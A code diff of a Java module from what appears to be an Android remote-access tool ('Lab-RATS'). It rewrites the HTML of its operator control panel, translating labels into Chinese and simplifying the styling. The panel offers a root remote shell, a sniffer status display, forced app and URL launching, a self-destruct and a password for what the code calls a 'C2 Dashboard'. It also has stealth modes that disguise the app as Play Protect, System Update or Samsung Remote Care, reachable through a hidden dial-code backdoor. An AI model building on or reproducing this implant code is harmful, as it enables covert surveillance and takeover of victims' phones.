@@ -54,161 +54,127 @@ public class TerminalModule extends BaseModule {
     private Response serveHome(IHTTPSession session) {
         WorkManager_Sync.notifyOperatorActivity();
         String ip = MainActivity.getLocalIpAddress();
-        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
+        String ipDisplay = (ip != null ? ip : "未知");
         String sessionId = FirebaseConfig.getSessionId();
 
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        
-        // Status Monitor Card
-        html.append("<div class=\"card\">");
-        String snifferStatus = StatusNotification.isServiceRunning() ? 
-            "<span style=\"color:var(--neon-green); font-size:0.7rem; vertical-align:middle;\">INTEL_ACTIVE</span>" :
-            "<span style=\"color:var(--danger); font-size:0.7rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
-        html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2; text-align: left; font-size: 1.6rem;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
-        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
-        html.append("<div style=\"margin-top: 15px;\">");
-        html.append("<div style=\"font-size:0.8rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
-        
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
-        
-        // Server Status
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">UPLINK_STATUS</div>");
-        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
+        // --- 状态卡片区 ---
+        html.append("<div class=\"adm-grid\">");
+        String snifferStatus = StatusNotification.isServiceRunning()
+                ? "<span style=\"color:#34d399;\">已启用</span>"
+                : "<span style=\"color:#f87171;\">未启用</span>";
+        html.append("<div class=\"adm-stat\"><div class=\"k\">链路状态</div><div class=\"v\">在线 ").append(snifferStatus).append("</div></div>");
+        html.append("<div class=\"adm-stat\"><div class=\"k\">监听端口</div><div class=\"v\">").append(server.getListeningPort()).append("</div></div>");
+        html.append("<div class=\"adm-stat\"><div class=\"k\">本机地址</div><div class=\"v\">").append(ipDisplay).append("</div></div>");
+        html.append("<div class=\"adm-stat\"><div class=\"k\">会话 ID</div><div class=\"v\">").append(sessionId).append("</div></div>");
         html.append("</div>");
-        
-        // Port
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">ACCESS_PORT</div>");
-        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(server.getListeningPort()).append("</div>");
-        html.append("</div>");
-        
-        // IP
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">VIRTUAL_ADDRESS</div>");
-        html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
-        html.append("</div>");
-        
-        html.append("</div>");
-        html.append("</div>");
-        html.append("</div>"); // Close Status Monitor card
-
-        // Section Separator (Tactical Divider)
-        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 15px 0;\"></div>");
 
         boolean termuxInstalled = isAppInstalled("com.termux");
         String promptSymbol = termuxInstalled ? "$" : "#";
 
-        // --- SYSTEM ACTIVITY LOGS SECTION ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow);\">");
-        html.append("<h2 style=\"color: var(--neon-yellow); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SYSTEM_ACTIVITY_LOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_ACTIVITY_LOGS', 'Real-time telemetry stream of background events and captured device actions.')\">INFO</span></h2>");
-        html.append("<div id=\"log-terminal\" class=\"terminal-text\" style=\"height: 250px; overflow-y: auto; font-size: 0.7rem;\">");
-        html.append("[LOADING_SYSTEM_LOGS...] Waiting for telemetry handshake...");
+        // --- 系统日志卡片 ---
+        html.append("<div class=\"adm-card\">");
+        html.append("<h2>系统日志</h2>");
+        html.append("<div id=\"log-terminal\" class=\"terminal-text\" style=\"height:250px; overflow-y:auto; font-size:13px; background:#0c0d0f; border:1px solid #232427; border-radius:8px; padding:12px; color:#c8c8c8;\">");
+        html.append("正在加载系统日志…");
         html.append("</div>");
-        html.append("<div style=\"margin-top: 15px; text-align: center;\">");
-        html.append("<button onclick=\"clearSessionLogs()\" class=\"btn btn-small\" style=\"border-color: #333; color: #888;\">PURGE_SESSION_LOGS</button>");
-        html.append("</div>");
+        html.append("<div style=\"margin-top:12px;\"><button onclick=\"clearSessionLogs()\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">清空日志</button></div>");
         html.append("</div>");
 
-        // --- REMOTE SHELL TERMINAL SECTION ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
-        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">REMOTE_SHELL <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_SHELL', 'Interactive command-line interface for direct system execution.')\">INFO</span></h2>");
-        html.append("<div style=\"background: #000; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); overflow: hidden;\">");
-        html.append("<div id=\"termux-uplink\" style=\"color: var(--neon-yellow); padding: 10px 20px 0 20px; font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; display: ").append(termuxInstalled ? "block" : "none").append(";\">[UPLINK] Termux bridge available.</div>");
-        html.append("<div id=\"shell-output\" style=\"padding: 20px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace; height: 250px; overflow-y: auto;\">");
-        html.append("<div>[STABILITY_OS] Initializing remote session...</div>");
+        // --- 远程终端卡片 ---
+        html.append("<div class=\"adm-card\">");
+        html.append("<h2>远程终端</h2>");
+        html.append("<div style=\"background:#0c0d0f; border:1px solid #232427; border-radius:8px; overflow:hidden;\">");
+        html.append("<div id=\"termux-uplink\" style=\"color:#eab308; padding:10px 16px 0 16px; font-size:12px; font-family:monospace; display:").append(termuxInstalled ? "block" : "none").append(";\">[UPLINK] Termux bridge available.</div>");
+        html.append("<div id=\"shell-output\" style=\"padding:14px 16px; font-size:13px; color:#9be9a8; line-height:1.6; font-family:monospace; height:250px; overflow-y:auto;\">");
+        html.append("<div>[系统] 正在初始化远程会话…</div>");
         html.append("<div>[UPLINK] Active path: ").append(escapeHtml(currentShellPath)).append("</div>");
-        html.append("<div style=\"opacity: 0.5; margin-top: 5px;\">Type 'help' for command list</div>");
+        html.append("<div style=\"opacity:0.5; margin-top:5px;\">输入 help 查看命令列表</div>");
         html.append("</div>");
-        html.append("<div style=\"border-top: 1px solid rgba(0, 242, 255, 0.1); padding: 10px; display: flex; align-items: center; background: rgba(0,0,0,0.5);\">");
-        html.append("<span id=\"terminal-prompt\" style=\"color: var(--terminal-green); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-right: 10px; white-space: nowrap;\">root@Android:").append(escapeHtml(currentShellPath)).append(promptSymbol).append("</span>");
-        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent; border: none; color: #fff; outline: none; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
+        html.append("<div style=\"border-top:1px solid #232427; padding:10px 12px; display:flex; align-items:center;\">");
+        html.append("<span id=\"terminal-prompt\" style=\"color:#9be9a8; font-family:monospace; font-size:13px; margin-right:10px; white-space:nowrap;\">root@Android:").append(escapeHtml(currentShellPath)).append(promptSymbol).append("</span>");
+        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"输入命令…\" style=\"background:transparent; border:none; color:#e6e6e6; outline:none; font-family:monospace; font-size:13px; flex-grow:1; padding:5px 0;\">");
         html.append("</div>");
         html.append("</div>");
-        html.append("<div class=\"terminal-input-wrap\" style=\"margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;\">");
-        html.append("<button onclick=\"executeShell()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin:0;\">EXECUTE</button>");
-        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"btn btn-small\" style=\"border-color: #333; color: #888; margin:0;\">CLEAR_SCREEN</button>");
+        html.append("<div style=\"margin-top:12px; display:flex; gap:10px; flex-wrap:wrap;\">");
+        html.append("<button onclick=\"executeShell()\" class=\"adm-btn\">执行</button>");
+        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">清屏</button>");
         html.append("</div>");
         html.append("</div>");
 
-        // --- DEVICE COMMANDS CARD ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-green);\">");
-        html.append("<h2 style=\"color: var(--neon-green); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">DEVICE_COMMANDS <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEVICE_COMMANDS', 'Execute tactical system overrides and device interactions.')\">INFO</span></h2>");
-        
-        // 1. Device Sound Setting
-        html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.8rem;\">DEVICE_SOUND_SETTING</div>");
-        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
-        html.append("<select id=\"device-cmd-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
-        html.append("<option value=\"vibrate\">VIBRATE_DEVICE</option>");
-        html.append("<option value=\"max-volume\">MAXIMIZE_VOLUME</option>");
-        html.append("<option value=\"silent-mode\">SILENT_MODE</option>");
+        // --- 设备命令卡片 ---
+        html.append("<div class=\"adm-card\">");
+        html.append("<h2>设备命令</h2>");
+        html.append("<div style=\"margin-bottom:16px;\">");
+        html.append("<div style=\"font-size:12px; color:#8b9096; margin-bottom:8px;\">设备声音设置</div>");
+        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
+        html.append("<select id=\"device-cmd-selector\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
+        html.append("<option value=\"vibrate\">振动设备</option>");
+        html.append("<option value=\"max-volume\">最大化音量</option>");
+        html.append("<option value=\"silent-mode\">静音模式</option>");
         html.append("</select>");
-        html.append("<button onclick=\"deviceCmd(document.getElementById('device-cmd-selector').value)\" class=\"btn\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
+        html.append("<button onclick=\"deviceCmd(document.getElementById('device-cmd-selector').value)\" class=\"adm-btn\">执行</button>");
         html.append("</div></div>");
 
-        // 2. Force Open App
-        html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.8rem;\">FORCE_OPEN_APP</div>");
-        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
-        html.append("<select id=\"app-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
-        html.append("<option value=\"\" style=\"background:#000;\">Select App...</option>");
+        // 打开应用
+        html.append("<div style=\"margin-bottom:16px;\">");
+        html.append("<div style=\"font-size:12px; color:#8b9096; margin-bottom:8px;\">打开应用</div>");
+        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
+        html.append("<select id=\"app-selector\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
+        html.append("<option value=\"\">选择应用…</option>");
         for (FirebaseConfig.AppEntry app : server.getLaunchableAppsProxy()) {
             html.append("<option value=\"").append(app.packageName).append("\">").append(escapeHtml(app.name)).append("</option>");
         }
         html.append("</select>");
-        html.append("<button onclick=\"openApp()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">OPEN_APP</button>");
+        html.append("<button onclick=\"openApp()\" class=\"adm-btn\">打开</button>");
         html.append("</div></div>");
 
-        // 3. Force Open URL
-        html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.8rem;\">FORCE_OPEN_URL</div>");
-        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
-        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
-        html.append("<button onclick=\"openUrl()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
+        // 打开网址
+        html.append("<div style=\"margin-bottom:8px;\">");
+        html.append("<div style=\"font-size:12px; color:#8b9096; margin-bottom:8px;\">打开网址</div>");
+        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
+        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
+        html.append("<button onclick=\"openUrl()\" class=\"adm-btn\">执行</button>");
         html.append("</div></div>");
-        html.append("</div>"); // Close DEVICE_COMMANDS card
-        
-        // --- STEALTH OPERATIONS CARD ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-orange);\">");
-        html.append("<h2 style=\"color: var(--neon-orange); font-size: 1.15rem; text-align: left;\">STEALTH_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'STEALTH_OPERATIONS', 'Advanced application camouflage. Choose an identity to masquerade as a functional decoy. Use dial pad code &lt;b&gt;*#1337#&lt;/b&gt; or the hidden backdoor to restore access.')\">INFO</span></h2>");
-        
-        html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.8rem;\">MASQUERADE_IDENTITY:</label>");
-        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
-        html.append("<option value=\"settings\">Play Protect (Google Shield)</option>");
-        html.append("<option value=\"calc\">Calculator</option>");
-        html.append("<option value=\"weather\">Weather</option>");
-        html.append("<option value=\"update\">System Update</option>");
-        html.append("<option value=\"smarttutor\">Smart Tutor (Samsung Remote Care)</option>");
-        html.append("<option value=\"logo\">Lab-RATS Logo (Unmasked)</option>");
+        html.append("</div>");
+
+        // --- 隐身模式卡片 ---
+        html.append("<div class=\"adm-card\">");
+        html.append("<h2>隐身模式</h2>");
+        html.append("<div style=\"margin-bottom:14px;\">");
+        html.append("<label style=\"font-size:12px; color:#8b9096;\">伪装身份:</label>");
+        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; margin-top:6px;\">");
+        html.append("<option value=\"settings\">Play Protect（安全盾牌）</option>");
+        html.append("<option value=\"calc\">计算器</option>");
+        html.append("<option value=\"weather\">天气</option>");
+        html.append("<option value=\"update\">系统更新</option>");
+        html.append("<option value=\"smarttutor\">Smart Tutor（三星远程协助）</option>");
+        html.append("<option value=\"logo\">Lab-RATS Logo（未伪装）</option>");
         html.append("</select>");
         html.append("</div>");
-
-        html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: flex-start;\">");
-        html.append("<button onclick=\"toggleStealth()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); border-radius:12px; padding: 10px 25px;\">INITIATE_STEALTH</button>");
-        html.append("<button onclick=\"restoreNormal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius:12px; padding: 10px 25px;\">RESTORE_NORMAL</button>");
+        html.append("<div style=\"display:flex; flex-direction:column; gap:10px; align-items:flex-start;\">");
+        html.append("<button onclick=\"toggleStealth()\" class=\"adm-btn\">启用隐身</button>");
+        html.append("<button onclick=\"restoreNormal()\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">恢复正常</button>");
         html.append("</div>");
         html.append("</div>");
 
-        // --- CHANGE ACCESS KEY SECTION ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
-        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SECURE_LOGIN <span class=\"info-trigger\" onclick=\"showInfo(event, 'SECURE_LOGIN', 'Update login password for the remote C2 Dashboard.')\">INFO</span></h2>");
-        html.append("<div style=\"display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<div style=\"width: 100%; max-width: 660px;\">");
-        html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px;\">");
-        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER NEW PASSWORD\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
-        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_PASSWORD</button>");
-        html.append("</form></div></div></div>");
+        // --- 修改访问密钥 ---
+        html.append("<div class=\"adm-card\">");
+        html.append("<h2>修改访问密钥</h2>");
+        html.append("<form action=\"/settings/password\" method=\"POST\" style=\"display:flex; gap:10px; flex-wrap:wrap;\">");
+        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"输入新密钥\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
+        html.append("<button type=\"submit\" class=\"adm-btn\">更新密钥</button>");
+        html.append("</form>");
+        html.append("</div>");
 
-        // --- DANGER ZONE SECTION ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--danger);\">");
-        html.append("<h2 style=\"color: var(--danger); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">DANGER_ZONE <span class=\"info-trigger\" onclick=\"showInfo(event, 'DANGER_ZONE', 'Critical system overrides for service termination and data sanitization.')\">INFO</span></h2>");
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px;\">");
-        html.append("<button onclick=\"deviceCmd('terminate')\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); margin:0;\">&#128683; TERMINATE_UPLINK</button>");
-        html.append("<button onclick=\"restartServer()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">&#128260; RESTART_SERVER</button>");
-        html.append("<button onclick=\"selfDestruct()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.1); margin:0;\">&#9763; SELF_DESTRUCT</button>");
+        // --- 危险操作 ---
+        html.append("<div class=\"adm-card\" style=\"border-color:#3a1d1d;\">");
+        html.append("<h2 style=\"color:#f87171;\">危险操作</h2>");
+        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
+        html.append("<button onclick=\"deviceCmd('terminate')\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#f87171; border-color:#3a1d1d;\">&#128683; 断开链路</button>");
+        html.append("<button onclick=\"restartServer()\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">&#128260; 重启服务</button>");
+        html.append("<button onclick=\"selfDestruct()\" class=\"adm-btn\" style=\"background:#2a1515; color:#f87171; border-color:#5b2020;\">&#9763; 自我销毁</button>");
         html.append("</div></div>");
 
         html.append(getFooter());
